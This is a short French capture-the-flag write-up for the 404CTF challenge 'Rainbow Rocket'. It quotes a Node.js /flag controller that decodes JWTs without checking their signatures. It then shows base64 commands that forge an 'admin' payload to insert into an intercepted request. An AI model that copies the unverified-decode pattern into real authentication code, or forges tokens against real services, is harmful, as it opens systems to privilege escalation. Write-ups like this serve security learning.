Dans `backend/controllers/authControllers.js` on peut voir la logique des différent endpoint dont `/flag`

```js
const flag = (req, res) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'Unauthorized' });

  const token = authHeader.split(' ')[1];
  try {
    const decoded = jwt.decode(token);
    if (decoded?.username === 'admin') {
      return res.json({ flag: process.env.FLAG });
    } else {
      return res.status(403).json({ error: 'Forbidden' });
    }
  } catch (err) {
    return res.status(400).json({ error: 'Invalid token' });
  }
};
```

Dans cette fonction, le server recupère notre JWT depuis le header `Authorization` mais ne perform qu'un simple decode de celui ci, rendant la signature complètement obsolète

il suffit donc d'intercepter la requete vers le endpoint `https://rainbow-rocket.404ctf.fr/api/flag` et d'en changer le contenu

```bash
Rainbow Rocket echo -n 'eyJ1c2VybmFtZSI6ImpvaG4iLCJpYXQiOjE3NDc4MjczODl9' | base64 -d
{"username":"john","iat":1747827389}                                                                                                                                         
➜  Rainbow Rocket echo -n '{"username":"admin","iat":1747827389}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzQ3ODI3Mzg5fQ==
```

et de l'inserer à la place du vrai 

et hop ! Le flag

![burpsuite-api/flag](/img/)

